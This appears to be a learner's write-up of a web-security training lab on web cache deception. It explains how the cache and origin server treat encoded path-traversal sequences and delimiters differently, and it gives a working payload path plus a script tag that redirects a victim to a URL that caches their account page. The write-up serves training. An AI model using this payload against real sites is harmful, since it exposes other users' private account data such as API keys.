Title: Exploiting cache server normalization for web cache deception
Level: Practitioner
Desc: To solve the lab, find the API key for the user carlos. You can log in to your own account using the following credentials: wiener:peter.
We have provided a list of possible delimiter characters to help you solve the lab: Web cache deception lab delimiter list. 

Note: 
`
 If the cache server resolves encoded dot-segments but the origin server doesn't, you can attempt to exploit the discrepancy by constructing a payload according to the following structure:
/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>
`

Note 2:
`
When exploiting normalization by the cache server, encode all characters in the path traversal sequence.
`

Note 3:
`
To exploit this discrepancy, you'll need to also identify a delimiter that is used by the origin server but not the cache.
For example, consider the payload /profile;%2f%2e%2e%2fstatic. The origin server uses ; as a delimiter:

    The cache interprets the path as: /static
    The origin server interprets the path as: /profile
`

the sign '?' as delimeter and also '%3F'
![image](https://github.com/user-attachments/assets/badb8452-9afe-4a41-a595-91e81c5ff598)

out payload path: `/my-account?%2f%2e%2e%2fresources/`

![image](https://github.com/user-attachments/assets/e84ed1c6-4637-418d-93ed-ca74ae9cd2bc)

But in case of sign '?' and '%3F' there is no cahing headers. But I found that '#' sign also works as delimeter. Percent encoded as hex is '%23'.
So the path should look like: `/my-account%23%2f%2e%2e%2fresources/`
Proxy see this like `/resources` (proxy have a cache rule on this path)
Server see this like: `/my-account` (it respects the delimeter)

Now we can add some `?random` to make proxy cache remember unique responses. Server still se that as request to the: `/my-account`



`<script>document.location="https://0a040073046cf4e880a7030d00ae009f.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?xyzsppodsd"</script>`

![image](https://github.com/user-attachments/assets/2a499919-61c7-488f-a40e-7c3e5c2d6b59)











